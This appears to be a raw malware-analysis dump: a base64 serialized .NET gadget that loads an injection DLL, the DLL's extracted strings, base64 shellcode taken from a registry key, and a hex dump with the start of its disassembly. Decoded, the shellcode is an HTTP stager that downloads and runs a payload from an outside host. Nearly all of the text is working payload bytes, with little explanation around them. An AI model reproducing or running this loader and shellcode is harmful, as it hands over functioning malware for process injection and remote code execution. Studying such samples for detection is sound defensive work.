JAAABAkGjml+AwAABBIFKA8AAAYmCHsmAAAEKBMAAApvFAAAChMGHxAWEQYWbxUAAApvFgAACigL
AAAGEwcJEQd+EAAACigNAAAGJgh7JQAABCgRAAAGJit1KBcAAAoTCBEIEQgfIG8YAAAKbxkAAAoT
CAUeMy0oGgAACm8bAAAKbxwAAApvHQAACnIBAABwchMAAHBvHgAAChEIKB8AAAomKysoGgAACm8b
AAAKbxwAAApvHQAACnITAABwcgEAAHBvHgAAChEIKB8AAAomFiggAAAKKgAAEzAGANQAAAADAAAR
KBEAAAoELgMELU0DKBIAAAoKfhAAAAoGjml+AQAABH4DAAAEKAcAAAYLBhYHBo5pKCEAAAp+EAAA
CiYWDH4QAAAKDRYWBwkWEgIoCQAABhUoCgAABiYrdSgXAAAKEwQRBBEEHyBvGAAACm8ZAAAKEwQE
HjMtKBoAAApvGwAACm8cAAAKbx0AAApyAQAAcHITAABwbx4AAAoRBCgfAAAKJisrKBoAAApvGwAA
Cm8cAAAKbx0AAApyEwAAcHIBAABwbx4AAAoRBCgfAAAKJhYoIAAACipiIAAQAACAAQAABBqAAgAA
BB9AgAMAAAQqAAAAQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAAQAgAACN+AACs
CAAAMAoAACNTdHJpbmdzAAAAANwSAAAoAAAAI1VTAAQTAAAQAAAAI0dVSUQAAAAUEwAAQAIAACNC
bG9iAAAAAAAAAAIAAAFXHQIUCQIAAAD6ATMAFgAAAQAAABsAAAAHAAAAQwAAABMAAAA5AAAAIQAA
ACcAAAARAAAAAwAAAAIAAAAPAAAAAQAAAAIAAAAFAAAAAABcBgEAAAAAAAYASQUeCAYAtgUeCAYA
dwTRBw8APggAAAYAnwQHBwYAHQUHBwYA/gQHBwYAnQUHBwYAaQUHBwYAggUHBwYAtgQHBwYAiwT/
BwYAaQT/BwYA4QQHBwYAZAmABgoAGQfRBwYAOgWABgYAhwaABgYAMQSABgYAxgeABgYAsQmABgoA
KAnRBwoAYgPRBwYAnwmABgYAMgaABgoA0QPRBwYAQwb/BwAAAAAuAAAAAAABAAEAAQAQAOAIAAA9
AAEAAQACAQAAqQgAAEkABAAUAAIBAACECAAASQASABQACgEQAFgBAABNACQAFAAKARAAowEAAE0A
KAAUAAIBAADqCAAASQA6ABQAEQAYAgcBEQDIAAcBEQDXAAcBBgakAgcBVoBLBgoBVoBMBAoBVoBC
AwoBVoDwBgoBVoAVAwoBVoBWBAoBVoCTAwoBVoAHCQoBVoCzAgoBVoDQBgoBVoDfBgoBVoCjBgoB
VoAPBgoBBgakAgcBVoDuAA4BVoA3AA4BVoB2AA4BVoCQAA4BVoCvAQ4BVoBzAg4BVoDZAQ4BVoD4
AA4BVoAvAQ4BVoAZAQ4BVoBlAA4BVoAjAg4BVoAAAg4BVoDyAQ4BVoDIAQ4BVoA+Ag4BVoCIAg4B
BgAVCR4ABgBPAx4ABgD6AgcBBgDvAgcBBgC8AgcBBgBwAxIBBgCBBxIBBgC6AxIBBgCEAgcBBgCg
AgcBBgDUBQcBBgDcBQcBBgDECAcBBgDSCAcBBgDRBAcBBgC8CAcBBgDOCRUBBgAKABUBBgAWAB4A
BgC5CR4ABgDDCR4ABgCvBx4ABgakAhgBVoCyABsBVoCjABsBVoBbAhsBVoBnAhsBVoBsARsBVoB8
ARsBVoBHARsBVoC8ABsBVoCOARsBUCAAAAAAhhi5BwYAAQB0IAAAAACGAGsJHwEBANwhAAAAAIYA
ZwYmAQQAAAAAAIAAliDIAiwBBgAAAAAAgACRIDEHMgEIAAAAAACAAJEgUAc4AQkAAAAAAIAAkSDQ
Aj0BCgAAAAAAgACRIIcDRQEOAAAAAACAAJEgQgNMAREAAAAAAIAAkSBXCVcBFwAAAAAAgACWIFcD
XQEZAAAAAACAAJYgCAplARwAAAAAAIAAliBYAHABIQAAAAAAgACWIOMJdwEkAAAAAACAAJEg8gmA
ASkAAAAAAIAAliAHCYoBLgAAAAAAgACWIDUDnQE4AAAAAACAAJYgJwOdATkAvCIAAAAAkRi/B6IB
OgAAAAEAIgAAAAIAewMAAAMA7QUAAAEAIgAAAAIA7QUAAAEA/gMAAAIA2gkAAAEAzQcAAAEAzQcA
AAEAiwcAAAIAGwYAAAMAOwQAAAQAgQkAAAEAPgkAAAIACAYAAAMAJgQAAAEAXQgAAAIA9gUAAAMA
SAkAAAQAcQYAAAUAmQgAAAYA5AIAAAEAowMAAAIA8AcAAAEA9wgAAAIAqwMAAAMA7wIAAAEAFQkA
AAIAMAkAAAMAngcAAAQAAgYCAAUAjAYAAAEAUQAAAAIATwMAAAMArAIAAAEAFQkAAAIAPgkAAAMA
CAYAAAQAOwQAAAUAgQkAAAEAFQkAAAIAPgkAAAMACAYAAAQAiwkCAAUAcgkAAAEA7AMAAAIAGAQA
AAMAcAgAAAQAXQgAAAUATQgAAAYAmQgAAAcAnQkAAAgAGwoAAAkAbgcCAAoAuwYAAAEATwMAAAEA
TwMJALkHAQARALkHBgAZALkHCgApALkHEAAxALkHEAA5ALkHEABBALkHEABJALkHEABRALkHEABZ
ALkHEABhALkHFQBpALkHEABxALkHEACJALkHBgB5ALkHBgChAHwHHgChAOQFMQCpACgGNQCxAAYD
OwCxAOQHQQCBAHcGRgC5AN0CTADBAAgEUADJACAGVADJADkGWQCxAB4JXgCxAMIDYwDRAN8DaADJ
AKcHaADJAH8DbACxAKsJcgDBAJgJeQDZAAMKhwAJABQAmQAJABgAngAJABwAowAJACAAqAAJACQA
rQAJACgAsgAJACwAtwAJADAAvAAJADQAwQAJADgAxgAJADwAywAJAEAA0AAJAEQA1QAJAEwA2gAJ
AFAA3wAJAFQA5AAJAFgArQAJAFwAxgAJAGAA6QAJAGQA7gAJAGgA8wAJAGwA0AAJAHAA0AAJAHQA
+AAJAHgAywAJAHwAowAJAIAAngAJAIQAqAAJAIgA/QAJAIwAAgEIAOwAngAIAPAAowAIAPQAqAAI
APgArQAIAPwAsgAIAAABtwAIAAQBvAAIAAgBwQAIAAwBxgAuAAsApgEuABMArwEuABsAzgEuACMA
1wEuACsA4wEuADMA4wEuADsA4wEuAEMA1wEuAEsA6QEuAFMA4wEuAFsA4wEuAGMAAQIuAGsAKwJD
AFsAOAJjAHMAngCDAHMAngDjAHMAngAaACEAfgBPBgEAAAEJAMgCAQBAAQsAMQcBAEABDQBQBwEA
AAEPANACAgAAAREAhwMCAAABEwBCAwIAAAEVAFcJAgBAARcAVwMBAEABGQAICgEAAAEbAFgAAQBA
AR0A4wkBAAABHwDyCQEAAAEhAAcJAQAAASMANQMBAAABJQAnAwEABIAAAAEAAAAAAAAAAAAAAAAA
lwcAAAIAAAAAAAAAAAAAAJAAvwIAAAAAAgAAAAAAAAAAAAAAkACABgAAAAADAAIABAACAAUAAgAG
AAIABwACAAAAAGtlcm5lbDMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyAHNoZWxsYmFzZTY0ADxN
b2R1bGU+AENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IAcGZuQVBDAFF1ZXVlVXNlckFQQwBDUkVB
VEVfU1VTUEVOREVEAENSRUFURV9ERUZBVUxUX0VSUk9SX01PREUAQ1JFQVRFX05FV19DT05TT0xF
AFNVU1BFTkRfUkVTVU1FAFRFUk1JTkFURQBJTVBFUlNPTkFURQBQQUdFX1JFQURXUklURQBQQUdF
X0VYRUNVVEVfUkVBRFdSSVRFAFpFUk9fRkxBRwBDUkVBVEVfUFJFU0VSVkVfQ09ERV9BVVRIWl9M
RVZFTABDUkVBVEVfU0hBUkVEX1dPV19WRE0AQ1JFQVRFX1NFUEFSQVRFX1dPV19WRE0AU0VUX1RI
UkVBRF9UT0tFTgBQUk9DRVNTX0lORk9STUFUSU9OAFNFVF9JTkZPUk1BVElPTgBRVUVSWV9JTkZP
Uk1BVElPTgBESVJFQ1RfSU1QRVJTT05BVElPTgBTVEFSVFVQSU5GTwBDUkVBVEVfTkVXX1BST0NF
U1NfR1JPVVAAREVUQUNIRURfUFJPQ0VTUwBDUkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdf
UFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJPQ0VTUwBNRU1fQ09NTUlUAENSRUFURV9VTklDT0RF
X0VOVklST05NRU5UAEVYVEVOREVEX1NUQVJUVVBJTkZPX1BSRVNFTlQAR0VUX0NPTlRFWFQAU0VU
X0NPTlRFWFQAQ1JFQVRFX05PX1dJTkRPVwBkd1gASU5IRVJJVF9QQVJFTlRfQUZGSU5JVFkAZHdZ
AHZhbHVlX18AZHdEYXRhAFNldFF1b3RhAGNiAG1zY29ybGliAFdpbkV4ZWMAVmlydHVhbEFsbG9j
AGdldF9JZABscFRocmVhZElkAGR3VGhyZWFkSWQAZHdQcm9jZXNzSWQAR2V0UHJvY2Vzc0J5SWQA
VmlydHVhbE1lbW9yeVJlYWQAU3VzcGVuZFRocmVhZABSZXN1bWVUaHJlYWQAQ3JlYXRlVGhyZWFk
AGhUaHJlYWQAT3BlblRocmVhZABQcm9jZXNzVGhyZWFkAGxwUmVzZXJ2ZWQAY21kAFJlcGxhY2UA
VmlydHVhbEZyZWUARHVwbGljYXRlSGFuZGxlAGhIYW5kbGUAYkluaGVyaXRIYW5kbGUAbHBUaXRs
ZQBnZXRfTWFpbk1vZHVsZQBQcm9jZXNzTW9kdWxlAGdldF9GaWxlTmFtZQBscEFwcGxpY2F0aW9u
TmFtZQBJcENtZExpbmUAZ2V0X0NvbW1hbmRMaW5lAGxwQ29tbWFuZExpbmUAZHdGcmVlVHlwZQBW
YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBUZXJtaW5hdGUAVmlydHVhbE1lbW9yeVdyaXRlAEd1
aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2Vt
Ymx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAZHdGaWxsQXR0cmli
dXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0
cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUARmxhZ3NBdHRyaWJ1dGUAQ29tcGls
YXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1i
bHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21w
YXRpYmlsaXR5QXR0cmlidXRlAGR3WFNpemUAZHdZU2l6ZQBnZXRfU2l6ZQBhcmNoU2l6ZQBkd1N0
YWNrU2l6ZQBuU2l6ZQBkd1NpemUAU3luY2hyb25pemUAc2l6ZQBJbmRleE9mAEZyb21CYXNlNjRT
dHJpbmcAU3Vic3RyaW5nAE1hcnNoYWwAQWxsAGtlcm5lbDMyLmRsbABsb2FkZXIuZGxsAExvYWRT
aGVsbABwYXJhbQBnZXRfSXRlbQBTeXN0ZW0ARW51bQBscE51bWJlck9mQnl0ZXNXcml0dGVuAFF1
ZXJ5TGltaXRlZEluZm9ybWF0aW9uAGxwUHJvY2Vzc0luZm9ybWF0aW9uAFNldEluZm9ybWF0aW9u
AFF1ZXJ5SW5mb3JtYXRpb24AVmlydHVhbE1lbW9yeU9wZXJhdGlvbgBTeXN0ZW0uUmVmbGVjdGlv
bgBQcm9jZXNzVGhyZWFkQ29sbGVjdGlvbgBXb3c2NERpc2FibGVXb3c2NEZzUmVkaXJlY3Rpb24A
V293NjRSZXZlcnRXb3c2NEZzUmVkaXJlY3Rpb24AbHBTdGFydHVwSW5mbwBaZXJvAGxwRGVza3Rv
cABscFN0YXJ0QWRkcgBsb2FkZXIAbHBCdWZmZXIAVG9Mb3dlcgBoU3RkRXJyb3IALmN0b3IALmNj
dG9yAEludFB0cgBwdHIAU3lzdGVtLkRpYWdub3N0aWNzAGdldF9UaHJlYWRzAGR3TWlsbGlzZWNv
bmRzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxl
clNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGJJbmhlcml0SGFuZGxlcwBscFRocmVhZEF0dHJpYnV0
ZXMAbHBQcm9jZXNzQXR0cmlidXRlcwBQcm9jZXNzQ3JlYXRpb25GbGFncwBkd0NyZWF0aW9uRmxh
Z3MAUHJvY2Vzc0FjY2Vzc0ZsYWdzAGR3RmxhZ3MAZHdYQ291bnRDaGFycwBkd1lDb3VudENoYXJz
AFRlc3RDbGFzcwBUaHJlYWRBY2Nlc3MAZHdEZXNpcmVkQWNjZXNzAENyZWF0ZVByb2Nlc3MAaFBy
b2Nlc3MAR2V0Q3VycmVudFByb2Nlc3MAbHBCYXNlQWRkcmVzcwBscEFkZHJlc3MAbHBTdGFydEFk
ZHJlc3MAV2FpdEZvclNpbmdsZU9iamVjdABJbmplY3QAbHBmbE9sZFByb3RlY3QAZmxQcm90ZWN0
AGZsTmV3UHJvdGVjdABFeGl0AGxwRW52aXJvbm1lbnQAU3RhcnQAQ29udmVydABoU3RkSW5wdXQA
aFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBuQ21kU2hvdwBWaXJ0dWFsQWxsb2NFeABWaXJ0dWFsUHJv
dGVjdEV4AENvcHkAV3JpdGVQcm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQAAAAARcwB5
AHMAdwBvAHcANgA0AAARcwB5AHMAdABlAG0AMwAyAAAAAACN6nhpjEbDQp1Qqa9R6S1IAAQgAQEI
AyAAAQUgAQEREQQgAQEOBCABAQIDBwEYAgYYDwcJHQURGBEUGBgJEkEYDgMAAAgFAAEdBQ4FAAES
WQgEIAASQQUgARJdCAMgAAgDAAAOBCABCAMEIAEOCAQAABJZBCAAEmkDIAAOBSACDg4OBgACElkO
DgQAAQEICAcFHQUYCRgOCAAEAR0FCBgICLd6XFYZNOCJBP8PHwAEAQAAAAQCAAAABAgAAAAEEAAA
AAQgAAAABEAAAAAEgAAAAAQAAQAABAACAAAEAAQAAAQAEAAABAAAEAAEAAAAAAQAAAABBAAAAAQE
AAAACAQAAAQABAAAAAIEBAAAAAQAAAgABAAAAQACBgkDBhEMAwYREAIGDgIGBgIGCAMGERwGIAMB
Dg4IBSACAQ4IBQACCg4IBQABAhAYBAABAhgHAAQYGAkJCQYAAwIYCQkKAAYYCQkYGAkQCQUAAgkY
CQcAAxgRHAIICgAFAhgYHQUIEBgGAAMYGBgYCAAFGBgYCAkJCQAFAhgYCAkQCRIACgIODhgYAhEQ
GA4QERgQERQEAAEJGAMAAAEIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MB
CAEAAgAAAAAACwEABmxvYWRlcgAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxNwAAKQEAJDU5
YWQxNWQyLTYyODAtNDBkNC1iMzA2LTQ5Y2IwYmViMzJkMAAADAEABzEuMC4wLjAAAAUBAAEAAAAA
AAAAALq3dlkAAAAAAgAAABwBAABIOAAASBoAAFJTRFNo7wQE5pXcT4nqwk7ZIz0sAQAAAEU6XHBy
aXZcZnJhbWV3b3JrXGNvZGVcdG9vbHNcZXhlMmpzXGxvYWRlclxvYmpcUmVsZWFzZVxsb2FkZXIu
cGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjDkAAAAAAAAAAAAApjkAAAAgAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAJg5AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAA
EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAw
AACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAAwDAAAAAAAAAAAAAAwDNAAAAFYAUwBfAFYA
RQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAA
AAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQA
AABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsARsAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABl
AEkAbgBmAG8AAABIAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMA
AAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAANgAHAAEARgBpAGwAZQBE
AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAGwAbwBhAGQAZQByAAAAAAAwAAgAAQBGAGkAbABlAFYA
ZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA2AAsAAQBJAG4AdABlAHIAbgBhAGwATgBh
AG0AZQAAAGwAbwBhAGQAZQByAC4AZABsAGwAAAAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIA
aQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADEANwAAACoAAQABAEwAZQBn
AGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAPgALAAEATwByAGkAZwBpAG4AYQBsAEYA
aQBsAGUAbgBhAG0AZQAAAGwAbwBhAGQAZQByAC4AZABsAGwAAAAAAC4ABwABAFAAcgBvAGQAdQBj
AHQATgBhAG0AZQAAAAAAbABvAGEAZABlAHIAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIA
cwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBz
AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAwAAAMAAAAuDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxlY3Rpb24u
QXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL


## Strings from decode:

"System.DelegateSerializationHolder
Delegate
target0
method0
0System.DelegateSerializationHolder+DelegateEntry"System.DelegateSerializationHolder/System.Reflection.MemberInfoSerializationHolder
0System.DelegateSerializationHolder+DelegateEntry
type
assembly
target
targetTypeAssembly
targetTypeName
methodName
delegateEntry
0System.DelegateSerializationHolder+DelegateEntry
/System.Runtime.Remoting.Messaging.HeaderHandler
Kmscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
target0
System.Delegate
DynamicInvoke
"System.DelegateSerializationHolder
Delegate
target0
method0
0System.DelegateSerializationHolder+DelegateEntry
/System.Reflection.MemberInfoSerializationHolder
/System.Reflection.MemberInfoSerializationHolder
Name
AssemblyName
ClassName
Signature
MemberType
GenericArguments
System.Type[]
,System.Object DynamicInvoke(System.Object[])
 System.Xml.Schema.XmlValueGetter
MSystem.Xml, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
target0
System.Reflection.Assembly
Load
!This program cannot be run in DOS mode.
.text
`.rsrc
@.reloc
&+u(
3-(
&++(
i(!
&+u(
3-(
&++(
*b 
BSJB
v2.0.50727
#Strings
#US
#GUID
#Blob
kernel32
cbReserved2
lpReserved2
shellbase64
<Module>
CREATE_BREAKAWAY_FROM_JOB
pfnAPC
QueueUserAPC
CREATE_SUSPENDED
CREATE_DEFAULT_ERROR_MODE
CREATE_NEW_CONSOLE
SUSPEND_RESUME
TERMINATE
IMPERSONATE
PAGE_READWRITE
PAGE_EXECUTE_READWRITE
ZERO_FLAG
CREATE_PRESERVE_CODE_AUTHZ_LEVEL
CREATE_SHARED_WOW_VDM
CREATE_SEPARATE_WOW_VDM
SET_THREAD_TOKEN
PROCESS_INFORMATION
SET_INFORMATION
QUERY_INFORMATION
DIRECT_IMPERSONATION
STARTUPINFO
CREATE_NEW_PROCESS_GROUP
DETACHED_PROCESS
CREATE_PROTECTED_PROCESS
DEBUG_PROCESS
DEBUG_ONLY_THIS_PROCESS
MEM_COMMIT
CREATE_UNICODE_ENVIRONMENT
EXTENDED_STARTUPINFO_PRESENT
GET_CONTEXT
SET_CONTEXT
CREATE_NO_WINDOW
dwX
INHERIT_PARENT_AFFINITY
dwY
value__
dwData
SetQuota
mscorlib
WinExec
VirtualAlloc
get_Id
lpThreadId
dwThreadId
dwProcessId
GetProcessById
VirtualMemoryRead
SuspendThread
ResumeThread
CreateThread
hThread
OpenThread
ProcessThread
lpReserved
cmd
Replace
VirtualFree
DuplicateHandle
hHandle
bInheritHandle
lpTitle
get_MainModule
ProcessModule
get_FileName
lpApplicationName
IpCmdLine
get_CommandLine
lpCommandLine
dwFreeType
ValueType
flAllocationType
Terminate
VirtualMemoryWrite
GuidAttribute
DebuggableAttribute
ComVisibleAttribute
AssemblyTitleAttribute
AssemblyTrademarkAttribute
dwFillAttribute
AssemblyFileVersionAttribute
AssemblyConfigurationAttribute
AssemblyDescriptionAttribute
FlagsAttribute
CompilationRelaxationsAttribute
AssemblyProductAttribute
AssemblyCopyrightAttribute
AssemblyCompanyAttribute
RuntimeCompatibilityAttribute
dwXSize
dwYSize
get_Size
archSize
dwStackSize
nSize
dwSize
Synchronize
size
IndexOf
FromBase64String
Substring
Marshal
All
kernel32.dll
loader.dll
LoadShell
param
get_Item
System
Enum
lpNumberOfBytesWritten
QueryLimitedInformation
lpProcessInformation
SetInformation
QueryInformation
VirtualMemoryOperation
System.Reflection
ProcessThreadCollection
Wow64DisableWow64FsRedirection
Wow64RevertWow64FsRedirection
lpStartupInfo
Zero
lpDesktop
lpStartAddr
loader
lpBuffer
ToLower
hStdError
.ctor
.cctor
IntPtr
ptr
System.Diagnostics
get_Threads
dwMilliseconds
System.Runtime.InteropServices
System.Runtime.CompilerServices
DebuggingModes
bInheritHandles
lpThreadAttributes
lpProcessAttributes
ProcessCreationFlags
dwCreationFlags
ProcessAccessFlags
dwFlags
dwXCountChars
dwYCountChars
TestClass
ThreadAccess
dwDesiredAccess
CreateProcess
hProcess
GetCurrentProcess
lpBaseAddress
lpAddress
lpStartAddress
WaitForSingleObject
Inject
lpflOldProtect
flProtect
flNewProtect
Exit
lpEnvironment
Start
Convert
hStdInput
hStdOutput
wShowWindow
nCmdShow
VirtualAllocEx
VirtualProtectEx
Copy
WriteProcessMemory
lpCurrentDirectory
syswow64
system32
z\V
WrapNonExceptionThrows
loader
Copyright 
  2017
$59ad15d2-6280-40d4-b306-49cb0beb32d0
1.0.0.0
RSDSh
#=,
E:\priv\framework\code\tools\exe2js\loader\obj\Release\loader.pdb
_CorDllMain
mscoree.dll
VS_VERSION_INFO
VarFileInfo
Translation
StringFileInfo
000004b0
Comments
CompanyName
FileDescription
loader
FileVersion
1.0.0.0
InternalName
loader.dll
LegalCopyright
Copyright 
  2017
LegalTrademarks
OriginalFilename
loader.dll
ProductName
loader
ProductVersion
1.0.0.0
Assembly Version
1.0.0.0
'System.Reflection.Assembly Load(Byte[])


## Contents of HKEY_CURRENT_USER\Software\AppDataLow\DataApp\Data

/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6IAAAABNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSAxMC4wOyBXaW5kb3dzIE5UIDYuMjsgV2luNjQ7IHg2NDsgVHJpZGVudC82LjApAFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYAFkx/1dXV1dRaDpWeaf/1et5WzHJUVFqA1FRaFAAAABTUGhXiZ/G/9XrYlkx0lJoAAJghFJSUlFSUGjrVS47/9WJxjH/V1dXV1ZoLQYYe//VhcB0RDH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S8Mf/rFetJ6Jn///8vQVpPcgAAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk1NTiedXaAAgAABTVmgSloni/9WFwHTNiwcBw4XAdeVYw+g3////bnMxLmNhbWJvZGlhZGFpbHkub3JnAAAA


## Dumped as shellcode

Hex dump: fc e8 89 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff 31 c0 ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f0 52 57 8b 52 10 8b 42 3c 01 d0 8b 40 78 85 c0 74 4a 01 d0 50 8b 48 18 8b 58 20 01 d3 e3 3c 49 8b 34 8b 01 d6 31 ff 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b 7d 24 75 e2 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b 12 eb 86 5d 68 6e 65 74 00 68 77 69 6e 69 54 68 4c 77 26 07 ff d5 e8 80 00 00 00 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 63 6f 6d 70 61 74 69 62 6c 65 3b 20 4d 53 49 45 20 31 30 2e 30 3b 20 57 69 6e 64 6f 77 73 20 4e 54 20 36 2e 32 3b 20 57 69 6e 36 34 3b 20 78 36 34 3b 20 54 72 69 64 65 6e 74 2f 36 2e 30 29 00 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 00 59 31 ff 57 57 57 57 51 68 3a 56 79 a7 ff d5 eb 79 5b 31 c9 51 51 6a 03 51 51 68 50 00 00 00 53 50 68 57 89 9f c6 ff d5 eb 62 59 31 d2 52 68 00 02 60 84 52 52 52 51 52 50 68 eb 55 2e 3b ff d5 89 c6 31 ff 57 57 57 57 56 68 2d 06 18 7b ff d5 85 c0 74 44 31 ff 85 f6 74 04 89 f9 eb 09 68 aa c5 e2 5d ff d5 89 c1 68 45 21 5e 31 ff d5 31 ff 57 6a 07 51 56 50 68 b7 57 e0 0b ff d5 bf 00 2f 00 00 39 c7 74 bc 31 ff eb 15 eb 49 e8 99 ff ff ff 2f 41 5a 4f 72 00 00 68 f0 b5 a2 56 ff d5 6a 40 68 00 10 00 00 68 00 00 40 00 57 68 58 a4 53 e5 ff d5 93 53 53 89 e7 57 68 00 20 00 00 53 56 68 12 96 89 e2 ff d5 85 c0 74 cd 8b 07 01 c3 85 c0 75 e5 58 c3 e8 37 ff ff ff 6e 73 31 2e 63 61 6d 62 6f 64 69 61 64 61 69 6c 79 2e 6f 72 67 00 00 00
0x00000000 fc               cld 
0x00000001 e889000000       call 0x0000008f
0x00000006 60               pushad 
0x00000007 89e5             mov ebp,esp
0x00000009 31d2             xor edx,edx
0x0000000b 648b5230         fs: mov edx,dword [edx + 48]
